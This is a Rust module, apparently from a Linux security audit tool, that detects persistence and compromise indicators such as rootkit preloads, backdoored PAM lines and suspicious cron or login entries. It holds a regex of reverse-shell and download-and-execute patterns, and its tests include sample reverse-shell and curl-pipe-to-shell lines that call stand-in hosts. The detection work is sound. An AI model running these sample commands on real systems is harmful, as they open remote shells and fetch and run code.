//! category: persistence — port de checks.d/80-persistence.sh.
//! Indicadores de compromiso y persistencia: ld.so.preload, cron/units/profiles con patrones de reverse
//! shell, PAM trucado, binarios modificados contra la base de paquetes, procesos corriendo desde /tmp.
//!
//! Divergencia con bash: PER-006 sin root daba PASS ("root sin authorized_keys") aunque no podía
//! mirar /root; acá queda como no evaluado.

use std::os::unix::fs::MetadataExt;
use std::sync::LazyLock;
use std::time::Duration;

use regex::Regex;

use super::Context;
use super::util::{Timed, expand, expand_all, grep_files, live_command_timeout, mode_within, read};
use super::walk::{WalkOpts, walk};
use crate::model::{Emitter, ResultExt, Severity::*};
use crate::system::OsFamily;
use crate::tr;

/// Patrones de alta confianza (casi nunca legítimos): descarga y ejecución, shells inversas, etc.
pub static STRONG: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(concat!(
        r"(curl|wget)[^|;&]*\|[[:space:]]*(sudo[[:space:]]+)?(ba|z)?sh",
        r"|/dev/tcp/",
        r"|nc(at)?[[:space:]]+[^|;]*-e[[:space:]]",
        r"|bash[[:space:]]+-i[[:space:]]",
        r"|base64[[:space:]]+(-d|--decode)[^|]*\|[[:space:]]*(ba)?sh",
        r"|/dev/shm/[^[:space:]]+",
        r"|/tmp/\.[A-Za-z]",
        r"|python[0-9.]*[[:space:]]+-c[[:space:]]+.*socket",
    ))
    .expect("regex válida")
});

/// "archivo:línea" de las coincidencias que no están comentadas, como máximo `max`.
fn hits(ctx: &Context, files: &[String], re: &Regex, max: usize) -> Vec<String> {
    grep_files(ctx, files, re, None)
        .into_iter()
        .filter(|(_, _, l)| !l.trim_start().starts_with('#'))
        .take(max)
        .map(|(f, n, _)| format!("{f}:{n}"))
        .collect()
}

/// Archivos regulares de un árbol (como `find DIR -type f`), en orden de recorrido.
fn files_under(ctx: &Context, dirs: &[&str]) -> Vec<String> {
    let mut v = Vec::new();
    for d in dirs {
        walk(ctx, d, &WalkOpts::default(), &mut |e| {
            if e.is_file() {
                v.push(e.path.to_string());
            }
        });
    }
    v
}

fn owner_name(uid: u32) -> String {
    crate::system::user_name(uid).unwrap_or_else(|| uid.to_string())
}

pub fn run(ctx: &Context, em: &mut Emitter) {
    // PER-001: ld.so.preload (técnica clásica de rootkit en espacio de usuario)
    match read(ctx, "/etc/ld.so.preload").filter(|t| !t.is_empty()) {
        Some(t) => {
            em.fail("PER-001", Critical, tr!("/etc/ld.so.preload exists and is not empty"))
                .with_detail(t.replace('\n', " ").chars().take(200).collect::<String>())
                .with_fix(tr!("Check every listed library: a typical rootkit technique"));
        }
        None => {
            em.pass("PER-001", Critical, tr!("/etc/ld.so.preload missing or empty"));
        }
    }

    // PER-002: LD_PRELOAD en entornos persistentes
    let files = expand_all(
        ctx,
        &[
            "/etc/environment", "/etc/profile", "/etc/profile.d/*", "/etc/bash.bashrc", "/etc/bashrc",
            "/etc/systemd/system.conf", "/etc/systemd/system/*.service", "/etc/systemd/system/*/*.conf",
        ],
    );
    let re = Regex::new(r"^[^#]*LD_PRELOAD").expect("regex válida");
    let mut x: Vec<String> = grep_files(ctx, &files, &re, Some(1)).into_iter().map(|(f, _, _)| f).collect();
    x.dedup();
    if x.is_empty() {
        em.pass("PER-002", High, tr!("No persistent LD_PRELOAD"));
    } else {
        em.warn("PER-002", High, tr!("LD_PRELOAD set in persistent configuration"))
            .with_detail(x.join(" "))
            .with_fix(tr!("Check that it is legitimate (some monitoring agents use it)"));
    }

    // PER-003: cron con patrones de reverse shell / descarga y ejecución
    if ctx.root {
        let mut files = files_under(
            ctx,
            &[
                "/etc/cron.d", "/etc/cron.hourly", "/etc/cron.daily", "/etc/cron.weekly", "/etc/cron.monthly",
                "/var/spool/cron", "/var/spool/anacron",
            ],
        );
        if ctx.path("/etc/crontab").is_file() {
            files.push("/etc/crontab".into());
        }
        let x = hits(ctx, &files, &STRONG, 8);
        if x.is_empty() {
            em.pass("PER-003", High, tr!("Cron without reverse shell/download-and-execute patterns"));
        } else {
            em.fail("PER-003", High, tr!("Cron with suspicious patterns"))
                .with_detail(x.join(" "))
                .with_fix(tr!("Review those entries: remote execution or reverse shells"));
        }
    } else {
        em.error("PER-003", High, tr!("Cron with suspicious patterns")).with_detail(tr!("root is required to read /var/spool/cron"));
    }

    // PER-004: permisos de los directorios de cron
    let mut bad = Vec::new();
    for d in ["/etc/cron.d", "/etc/cron.daily", "/etc/cron.hourly", "/etc/cron.weekly", "/etc/cron.monthly"] {
        let Ok(m) = std::fs::metadata(ctx.path(d)) else { continue };
        if !m.is_dir() {
            continue;
        }
        let mode = m.mode() & 0o7777;
        if !mode_within(mode, 0o755) || m.uid() != 0 {
            bad.push(format!("{d}({mode:o} {})", owner_name(m.uid())));
        }
    }
    if let Some(m) = std::fs::metadata(ctx.path("/etc/crontab")).ok().filter(|m| m.is_file()) {
        let mode = m.mode() & 0o7777;
        if !mode_within(mode, 0o644) || m.uid() != 0 {
            bad.push(format!("/etc/crontab({mode:o})"));
        }
    }
    if bad.is_empty() {
        em.pass("PER-004", Medium, tr!("Cron permissions are correct"));
    } else {
        em.fail("PER-004", Medium, tr!("Incorrect cron permissions")).with_detail(bad.join(" ")).with_fix(tr!("chown root:root and chmod go-w"));
    }

    // PER-005: units de systemd que ejecutan desde ubicaciones sospechosas
    let units = expand_all(
        ctx,
        &["/etc/systemd/system/*.service", "/etc/systemd/system/*/*.service", "/etc/systemd/system/*/*.conf"],
    );
    let re = Regex::new(
        r"^[[:space:]]*Exec(Start|StartPre|StartPost)[[:space:]]*=[-@+!]*[[:space:]]*(/tmp/|/var/tmp/|/dev/shm/|/home/|/root/|[^[:space:]]*/\.[A-Za-z])",
    )
    .expect("regex válida");
    let x: Vec<String> = grep_files(ctx, &units, &re, None).into_iter().take(8).map(|(f, n, _)| format!("{f}:{n}")).collect();
    if x.is_empty() {
        em.pass("PER-005", High, tr!("systemd units without executables in /tmp, /dev/shm or hidden paths"));
    } else {
        em.warn("PER-005", High, tr!("systemd units executing from unusual locations"))
            .with_detail(x.join(" "))
            .with_fix(tr!("Verify (running from /home or /tmp is a persistence technique)"));
    }

    // PER-006: authorized_keys de root
    let ak = ctx.path("/root/.ssh/authorized_keys");
    if !ctx.root {
        em.error("PER-006", Low, tr!("root's authorized SSH keys")).with_detail(tr!("root is required to read /root"));
    } else if std::fs::metadata(&ak).is_ok_and(|m| m.len() > 0) {
        let text = std::fs::read_to_string(&ak).unwrap_or_default();
        // sin opciones, la línea empieza directo con el tipo de clave
        let n = text.lines().filter(|l| l.starts_with("ssh-") || l.starts_with("ecdsa-") || l.starts_with("sk-")).count();
        if n > 0 {
            em.warn("PER-006", Low, &tr!("root has {n} authorized SSH keys without restrictions (from=/command=)", n = n))
                .with_detail("/root/.ssh/authorized_keys")
                .with_fix(tr!("Restrict with from=/command= or remove root key access"));
        } else {
            em.pass("PER-006", Low, tr!("root's keys have restrictions"));
        }
    } else {
        em.pass("PER-006", Low, tr!("root has no authorized_keys"));
    }

    package_integrity(ctx, em);

    // PER-008: scripts de login con patrones sospechosos
    let files = expand_all(
        ctx,
        &[
            "/etc/profile", "/etc/profile.d/*", "/etc/bash.bashrc", "/etc/bashrc", "/etc/zsh/zshrc", "/root/.bashrc",
            "/root/.profile", "/root/.bash_profile", "/home/*/.bashrc", "/home/*/.profile", "/home/*/.bash_profile",
        ],
    );
    let x = hits(ctx, &files, &STRONG, 8);
    if x.is_empty() {
        em.pass("PER-008", High, tr!("Login scripts without suspicious patterns"));
    } else {
        em.fail("PER-008", High, tr!("Login scripts with suspicious patterns"))
            .with_detail(x.join(" "))
            .with_fix(tr!("Review: they run on every user session"));
    }

    // PER-009 / PER-010: PAM trucado
    let pam = expand(ctx, "/etc/pam.d/*");
    let re = Regex::new(r"^[[:space:]]*auth[[:space:]]+sufficient[[:space:]]+pam_permit\.so").expect("regex válida");
    let x: Vec<String> = grep_files(ctx, &pam, &re, None).into_iter().map(|(f, n, _)| format!("{f}:{n}")).collect();
    if x.is_empty() {
        em.pass("PER-009", Critical, tr!("PAM without 'auth sufficient pam_permit.so'"));
    } else {
        em.fail("PER-009", Critical, tr!("PAM accepts any authentication (auth sufficient pam_permit.so)"))
            .with_detail(x.join(" "))
            .with_fix(tr!("Remove that line: it allows logging in without a password"));
    }
    let re = Regex::new(r"^[[:space:]]*[a-z-]+[[:space:]]+[^#]*pam_exec\.so").expect("regex válida");
    let x: Vec<String> = grep_files(ctx, &pam, &re, None).into_iter().map(|(f, n, _)| format!("{f}:{n}")).collect();
    if x.is_empty() {
        em.pass("PER-010", Medium, tr!("PAM without pam_exec"));
    } else {
        em.warn("PER-010", Medium, tr!("PAM runs external scripts (pam_exec)"))
            .with_detail(x.join(" "))
            .with_fix(tr!("Check that the script is legitimate and not writable by others"));
    }

    // PER-011: rc.local con comandos
    let re = Regex::new(r"^[[:space:]]*(#|$|exit[[:space:]]+0)").expect("regex válida");
    let cmds: Vec<String> = read(ctx, "/etc/rc.local")
        .map(|t| t.lines().filter(|l| !re.is_match(l)).map(str::to_string).collect())
        .unwrap_or_default();
    if cmds.is_empty() {
        em.pass("PER-011", Low, tr!("rc.local has no commands"));
    } else {
        let d: String = cmds.iter().take(3).map(|l| format!("{l};")).collect::<String>().chars().take(200).collect();
        em.warn("PER-011", Low, tr!("/etc/rc.local runs commands at boot")).with_detail(d).with_fix(tr!("Migrate to a documented systemd unit"));
    }

    // PER-012: kernel "tainted" por módulos externos o sin firmar
    match read(ctx, "/proc/sys/kernel/tainted").and_then(|t| t.trim().parse::<u64>().ok()) {
        None => {
            em.na("PER-012", Medium, tr!("Out-of-tree kernel modules")).with_detail(tr!("no /proc/sys/kernel/tainted"));
        }
        Some(t) if t & (4096 | 8192) != 0 => {
            let mods = tainting_modules(ctx);
            let mut detail = taint_summary(t);
            if !mods.is_empty() {
                let more = if mods.len() > 8 { format!(" (+{})", mods.len() - 8) } else { String::new() };
                detail = format!("{detail}: {}{more}", mods.iter().take(8).cloned().collect::<Vec<_>>().join(", "));
            }
            em.warn("PER-012", Medium, tr!("Out-of-tree or unsigned kernel modules loaded"))
                .with_detail(detail)
                .with_fix(tr!("Review with lsmod/modinfo (they may be legitimate: ZFS, NVIDIA, VirtualBox)"));
        }
        Some(t) => {
            em.pass("PER-012", Medium, tr!("No out-of-tree or unsigned kernel modules")).with_detail(taint_summary(t));
        }
    }

    processes(ctx, em);
}

/// Letras de taint del kernel por bit, en el orden de Documentation/admin-guide/tainted-kernels.rst
/// (P=propietario, W=warning, O=fuera del árbol, E=sin firmar...).
const TAINT_FLAGS: &[u8; 19] = b"PFSRMBUDAWCIOELKXTN";

/// `tainted=12801 (P W O E)`: el número de /proc/sys/kernel/tainted es una máscara de bits, no un módulo.
pub fn taint_summary(t: u64) -> String {
    let letters: Vec<String> = (0..64)
        .filter(|b| t >> b & 1 == 1)
        .map(|b| TAINT_FLAGS.get(b).map_or(format!("bit{b}"), |c| (*c as char).to_string()))
        .collect();
    if letters.is_empty() { format!("tainted={t}") } else { format!("tainted={t} ({})", letters.join(" ")) }
}

/// Módulos que marcaron el kernel: los que tienen letras en /sys/module/<m>/taint (ej. nvidia: POE).
fn tainting_modules(ctx: &Context) -> Vec<String> {
    let Ok(dir) = std::fs::read_dir(ctx.path("/sys/module")) else { return Vec::new() };
    let mut v: Vec<String> = dir
        .flatten()
        .filter_map(|e| {
            let name = e.file_name().to_string_lossy().into_owned();
            let t = std::fs::read_to_string(e.path().join("taint")).ok()?;
            let t = t.trim();
            (!t.is_empty()).then(|| format!("{name}({t})"))
        })
        .collect();
    v.sort();
    v
}

/// PER-007: binarios del sistema modificados respecto del paquete original.
fn package_integrity(ctx: &Context, em: &mut Emitter) {
    let title = tr!("Binary integrity against the package database");
    if ctx.fast {
        em.na("PER-007", High, title).with_detail(tr!("skipped by --fast"));
        return;
    }
    if !ctx.root {
        em.error("PER-007", High, title).with_detail(tr!("root is required"));
        return;
    }
    let (cmd, args): (&str, &[&str]) = match ctx.os.family {
        OsFamily::Debian => ("dpkg", &["-V"]),
        OsFamily::Rhel => ("rpm", &["-Va"]),
        OsFamily::Unknown => {
            em.na("PER-007", High, tr!("Binary integrity")).with_detail(tr!("unrecognized distro"));
            return;
        }
    };
    let shown = format!("{cmd} {}", args.join(" "));
    let out = match live_command_timeout(ctx, cmd, args, Duration::from_secs(180)) {
        None => {
            em.na("PER-007", High, tr!("Binary integrity")).with_detail(tr!("{cmd} unavailable", cmd = cmd));
            return;
        }
        Some(Timed::TimedOut) => {
            em.error("PER-007", High, title).with_detail(format!("timeout ({shown})"));
            return;
        }
        Some(Timed::Done(o)) => o.stdout,
    };
    let bad = modified_binaries(&out);
    if bad.is_empty() {
        em.pass("PER-007", High, &tr!("System binaries match their packages ({shown})", shown = shown));
    } else {
        em.fail("PER-007", High, &tr!("System binaries modified from their package ({n})", n = bad.len()))
            .with_detail(bad.iter().take(8).cloned().collect::<Vec<_>>().join(" "))
            .with_fix(tr!("Reinstall the package and investigate the host: it may be compromised"));
    }
}

/// De la salida de `dpkg -V` / `rpm -Va`: archivos con checksum distinto (5 en la 3.ª columna),
/// que no son de configuración, en rutas de binarios o bibliotecas sensibles.
pub fn modified_binaries(out: &str) -> Vec<String> {
    static PATH: LazyLock<Regex> = LazyLock::new(|| {
        Regex::new(r"^/(usr/)?s?bin/|^/(usr/)?lib(32|64)?/.*(security/|libc[.-]|ld-linux|libcrypto|libssl|libpam)").expect("regex válida")
    });
    out.lines()
        .filter_map(|l| {
            let f: Vec<&str> = l.split_whitespace().collect();
            let (first, last) = (f.first()?, f.last()?);
            (first.as_bytes().get(2) == Some(&b'5') && f.get(1) != Some(&"c") && PATH.is_match(last)).then(|| last.to_string())
        })
        .collect()
}

/// Procesos a excluir de PER-013..015: el propio linaudit (se autoinculpaba al ejecutarse desde un
/// directorio de compilacion en /tmp antes de instalarlo) y, si corre el mismo binario (mismo
/// dispositivo e inodo, no solo la misma ruta), su proceso padre (p.ej. un wrapper re-ejecutado
/// desde el mismo binario). No excluye ningun otro proceso. Devuelve (pid, ruta del exe) de cada
/// excluido para poder anunciarlo en el detalle: nada se suprime en silencio.
fn self_pids() -> Vec<(String, String)> {
    let me = std::process::id();
    let my_exe =
        std::fs::read_link("/proc/self/exe").map(|p| p.to_string_lossy().into_owned()).unwrap_or_default();
    let mut skip = vec![(me.to_string(), my_exe)];
    if let Some(ppid) = parent_pid() {
        let parent_link = format!("/proc/{ppid}/exe");
        // identidad por (dispositivo, inodo) del binario real, no por coincidencia de la ruta: una
        // ruta igual puede apuntar a ficheros distintos (bind mounts, chroots, binario reemplazado).
        if let Ok(parent_exe) = std::fs::read_link(&parent_link) {
            if same_binary("/proc/self/exe", &parent_link) {
                skip.push((ppid.to_string(), parent_exe.to_string_lossy().into_owned()));
            }
        }
    }
    skip
}

/// Verdadero si ambas rutas resuelven al mismo fichero (mismo dispositivo e inodo). `std::fs::metadata`
/// sigue el symlink magico de /proc/<pid>/exe hasta el binario real. Ante cualquier fallo de stat
/// devuelve false: mas vale no excluir que excluir de mas.
fn same_binary(a: impl AsRef<std::path::Path>, b: impl AsRef<std::path::Path>) -> bool {
    match (std::fs::metadata(a), std::fs::metadata(b)) {
        (Ok(ma), Ok(mb)) => ma.dev() == mb.dev() && ma.ino() == mb.ino(),
        _ => false,
    }
}

/// ppid del proceso actual, leido de /proc/self/stat.
fn parent_pid() -> Option<u32> {
    parse_ppid(&std::fs::read_to_string("/proc/self/stat").ok()?)
}

/// Extrae el ppid de una linea de /proc/<pid>/stat. El nombre del proceso (campo 2) va entre
/// parentesis y puede contener espacios y ')'; tras el ultimo ')' vienen: state ppid pgrp ...
/// -> ppid es el segundo token. Devuelve None si la linea esta malformada o no hay ppid.
fn parse_ppid(stat: &str) -> Option<u32> {
    stat.rsplit_once(')')?.1.split_whitespace().nth(1)?.parse().ok()
}

/// Clasifica procesos (pid, destino de /proc/<pid>/exe) en: ejecutados desde /tmp, con el binario
/// borrado, o desde memoria anonima. `skip` son pids a ignorar (ver `self_pids`).
fn classify_processes<'a>(
    procs: impl IntoIterator<Item = (&'a str, &'a str)>,
    skip: &[String],
) -> (Vec<String>, Vec<String>, Vec<String>) {
    let (mut tmpx, mut delx, mut memx) = (Vec::new(), Vec::new(), Vec::new());
    for (pid, e) in procs {
        if e.is_empty() || skip.iter().any(|s| s == pid) {
            continue;
        }
        if e.starts_with("/tmp/") || e.starts_with("/var/tmp/") || e.starts_with("/dev/shm/") {
            tmpx.push(format!("{pid}:{e}"));
        } else if e.starts_with("/memfd:") {
            // runc/crun se re-ejecutan desde memfd a proposito (CVE-2019-5736)
            if !e.contains("/memfd:runc") && !e.contains("/memfd:crun") {
                memx.push(format!("{pid}:{}", e.trim_end_matches(" (deleted)")));
            }
        } else if e.ends_with("(deleted)") {
            delx.push(format!("{pid}:{}", e.trim_end_matches(" (deleted)")));
        }
    }
    (tmpx, delx, memx)
}

/// PER-013..015: procesos que corren desde /tmp, memoria anónima o con el binario borrado.
fn processes(ctx: &Context, em: &mut Emitter) {
    if !ctx.root {
        em.error("PER-013", High, tr!("Processes from unusual locations")).with_detail(tr!("root is required to read /proc/*/exe"));
        em.error("PER-015", High, tr!("Processes from anonymous memory")).with_detail(tr!("root is required"));
        em.error("PER-014", Low, tr!("Processes with a replaced binary")).with_detail(tr!("root is required"));
        return;
    }
    // como el glob /proc/[0-9]* de bash: orden alfabético, no numérico
    let mut pids: Vec<String> = std::fs::read_dir(ctx.path("/proc"))
        .map(|d| {
            d.flatten()
                .map(|e| e.file_name().to_string_lossy().into_owned())
                .filter(|n| n.starts_with(|c: char| c.is_ascii_digit()))
                .collect()
        })
        .unwrap_or_default();
    pids.sort();
    // no autoinculpar a linaudit cuando se ejecuta desde un directorio de compilacion en /tmp.
    let excluded = self_pids();
    let skip: Vec<String> = excluded.iter().map(|(pid, _)| pid.clone()).collect();
    let procs: Vec<(String, String)> = pids
        .into_iter()
        .filter_map(|pid| {
            let exe = std::fs::read_link(ctx.path(&format!("/proc/{pid}/exe"))).ok()?;
            let e = exe.to_string_lossy().into_owned();
            (!e.is_empty()).then_some((pid, e))
        })
        .collect();
    let (tmpx, delx, memx) =
        classify_processes(procs.iter().map(|(p, e)| (p.as_str(), e.as_str())), &skip);
    let first8 = |v: &[String]| v.iter().take(8).cloned().collect::<Vec<_>>().join(" ");
    // pids suprimidos de PER-013..015 (linaudit y su padre): se anuncian para que un operador o
    // revisor de logs vea que se excluyo y por que, en vez de desaparecer en silencio.
    let excluded_note = excluded
        .iter()
        .map(|(pid, exe)| format!("excluded: own/parent process {pid}:{exe}"))
        .collect::<Vec<_>>()
        .join(" ");
    if memx.is_empty() {
        em.pass("PER-015", High, tr!("No process runs from anonymous memory (memfd)"));
    } else {
        em.warn("PER-015", High, tr!("Processes running from anonymous memory (memfd, no file on disk)"))
            .with_detail(first8(&memx))
            .with_fix(tr!("Typical of fileless malware, though some legitimate agents use it: identify the process (ls -l /proc/<pid>/exe)"));
    }
    if tmpx.is_empty() {
        em.pass("PER-013", High, tr!("No process runs from /tmp, /dev/shm or memfd")).with_detail(&excluded_note);
    } else {
        em.fail("PER-013", High, tr!("Processes running from /tmp, /dev/shm or anonymous memory"))
            .with_detail(format!("{} {excluded_note}", first8(&tmpx)))
            .with_fix(tr!("Investigate immediately (ls -l /proc/<pid>/exe, /proc/<pid>/cmdline)"));
    }
    if delx.is_empty() {
        em.pass("PER-014", Low, tr!("No process runs with a deleted/replaced binary"));
    } else {
        em.warn("PER-014", Low, tr!("Processes whose binary was replaced on disk (restarts missing after updates)"))
            .with_detail(first8(&delx))
            .with_fix(tr!("Restart those services (needrestart / needs-restarting -s)"));
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::checks::fixture::Fixture;
    use crate::model::Status;

    #[test]
    fn patrones_fuertes() {
        for yes in [
            "* * * * * root curl -s http://x.example/a.sh | bash",
            "wget -qO- http://x | sudo sh",
            "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
            "nc 10.0.0.1 4444 -e /bin/sh",
            "echo aGk= | base64 -d | sh",
            "/dev/shm/.x",
            "/tmp/.hidden/run",
            "python3 -c 'import socket,os'",
        ] {
            assert!(STRONG.is_match(yes), "{yes}");
        }
        for no in ["curl -o /var/backups/x https://example.com/x", "17 * * * * root cd / && run-parts --report /etc/cron.hourly"] {
            assert!(!STRONG.is_match(no), "{no}");
        }
    }

    #[test]
    fn letras_de_taint() {
        assert_eq!(taint_summary(0), "tainted=0");
        assert_eq!(taint_summary(512), "tainted=512 (W)");
        assert_eq!(taint_summary(12801), "tainted=12801 (P W O E)");
        assert_eq!(taint_summary(1 << 20), "tainted=1048576 (bit20)");
    }

    #[test]
    fn sistema_limpio() {
        let f = Fixture::new();
        f.file("/etc/crontab", "17 * * * * root cd / && run-parts --report /etc/cron.hourly\n")
            .file("/etc/pam.d/common-auth", "auth [success=1 default=ignore] pam_unix.so nullok\n")
            .file("/etc/rc.local", "#!/bin/sh -e\n# comentario\n\nexit 0\n")
            .file("/proc/sys/kernel/tainted", "0\n");
        let r = f.run(run);
        for id in ["PER-001", "PER-002", "PER-003", "PER-005", "PER-006", "PER-008", "PER-009", "PER-010", "PER-011", "PER-012"] {
            assert_eq!(r[id].status, Status::Pass, "{id}: {:?}", r[id]);
        }
        assert_eq!(r["PER-007"].status, Status::Na, "fixtures: --fast");
    }

    #[test]
    fn sistema_comprometido() {
        let f = Fixture::new();
        f.file("/etc/ld.so.preload", "/usr/lib/libprocesshider.so\n")
            .file("/etc/profile.d/x.sh", "export LD_PRELOAD=/lib/evil.so\n")
            .file("/etc/cron.d/update", "# curl http://x | sh (comentado no cuenta)\n*/5 * * * * root curl -fsSL http://x.example/i.sh | sh\n")
            .file("/etc/systemd/system/backdoor.service", "[Service]\nExecStart=/tmp/.x/run\n")
            .file("/home/ana/.bashrc", "alias ll='ls -l'\nbash -i >& /dev/tcp/1.2.3.4/9001 0>&1 \n")
            .file("/etc/pam.d/sshd", "auth sufficient pam_permit.so\nsession optional pam_exec.so /usr/local/bin/x\n")
            .file("/etc/rc.local", "#!/bin/sh\n/opt/agent/start\nexit 0\n")
            .file("/proc/sys/kernel/tainted", "12801\n")
            .file("/sys/module/nvidia/taint", "POE\n")
            .file("/sys/module/nvidia_drm/taint", "POE\n")
            .file("/sys/module/ext4/taint", "\n")
            .file("/root/.ssh/authorized_keys", "ssh-ed25519 AAAA admin\nfrom=\"10.0.0.1\" ssh-ed25519 BBBB backup\n");
        let r = f.run(run);
        assert_eq!(r["PER-001"].detail, "/usr/lib/libprocesshider.so ");
        assert_eq!(r["PER-002"].detail, "/etc/profile.d/x.sh");
        assert_eq!(r["PER-003"].detail, "/etc/cron.d/update:2");
        assert_eq!(r["PER-005"].detail, "/etc/systemd/system/backdoor.service:2");
        assert_eq!(r["PER-006"].title, "root tiene 1 claves SSH autorizadas sin restricciones (from=/command=)");
        assert_eq!(r["PER-008"].detail, "/home/ana/.bashrc:2");
        assert_eq!(r["PER-009"].detail, "/etc/pam.d/sshd:1");
        assert_eq!(r["PER-010"].detail, "/etc/pam.d/sshd:2");
        // las líneas que empiezan con # (incluido el shebang) no cuentan, como en bash
        assert_eq!(r["PER-011"].detail, "/opt/agent/start;");
        assert_eq!(r["PER-012"].status, Status::Warn);
        assert_eq!(r["PER-012"].detail, "tainted=12801 (P W O E): nvidia(POE), nvidia_drm(POE)");
    }

    #[test]
    fn dpkg_verify() {
        let out = "??5??????   /usr/bin/ls\n??5?????? c /etc/ssh/sshd_config\n??5??????   /usr/share/doc/x\nmissing     /usr/lib/x86_64-linux-gnu/security/pam_unix.so\n??5??????   /usr/lib/x86_64-linux-gnu/libssl.so.3\n";
        assert_eq!(modified_binaries(out), ["/usr/bin/ls", "/usr/lib/x86_64-linux-gnu/libssl.so.3"]);
    }

    #[test]
    fn sin_root() {
        let mut f = Fixture::new();
        f.is_root = false;
        let r = f.run(run);
        for id in ["PER-003", "PER-006", "PER-013", "PER-014", "PER-015"] {
            assert_eq!(r[id].status, Status::Error, "{id}");
        }
    }

    #[test]
    fn per013_excluye_proceso_propio() {
        let me = std::process::id().to_string();
        let parent = "4242"; // padre que comparte el mismo exe que linaudit
        let skip = vec![me.clone(), parent.to_string()];
        let procs = [
            (me.as_str(), "/tmp/build/linaudit"), // propio: excluido, no se autoinculpa
            (parent, "/tmp/build/linaudit"),      // padre con mismo exe: excluido
            ("9999", "/tmp/.evil/payload"),       // OTRO proceso en /tmp: debe reportarse
            ("8888", "/memfd:stage0"),            // memfd anonimo: debe reportarse
            ("7777", "/memfd:runc_1"),            // runc: ignorado a proposito
            ("6666", "/usr/bin/bash (deleted)"),  // binario borrado: debe reportarse
            ("5555", "/usr/bin/bash"),            // normal: nada
        ];
        let (tmpx, delx, memx) = classify_processes(procs.iter().copied(), &skip);
        // el propio linaudit y su padre quedan fuera; el resto se evalua normalmente.
        assert_eq!(tmpx, ["9999:/tmp/.evil/payload"]);
        assert_eq!(memx, ["8888:/memfd:stage0"]);
        assert_eq!(delx, ["6666:/usr/bin/bash"]);
    }

    #[test]
    fn parse_ppid_comm_con_parentesis_y_espacio() {
        // el nombre del proceso (campo 2) contiene ')' y un espacio; el ppid va tras el ultimo ')'.
        assert_eq!(parse_ppid("1234 (we)ird proc) S 4242 1 1 0 -1 4194560 100 0 0 0"), Some(4242));
    }

    #[test]
    fn parse_ppid_malformado_o_sin_padre() {
        assert_eq!(parse_ppid("basura sin parentesis"), None);
        assert_eq!(parse_ppid("1234 (proc) S"), None); // hay estado pero no ppid tras el
        assert_eq!(parse_ppid(""), None);
    }

    #[test]
    fn per013_sin_exclusion_reporta_todo() {
        // sin skip, un proceso en /tmp se reporta (comportamiento original intacto).
        let procs = [("1234", "/tmp/x"), ("1", "/sbin/init")];
        let (tmpx, _, _) = classify_processes(procs.iter().copied(), &[]);
        assert_eq!(tmpx, ["1234:/tmp/x"]);
    }
}
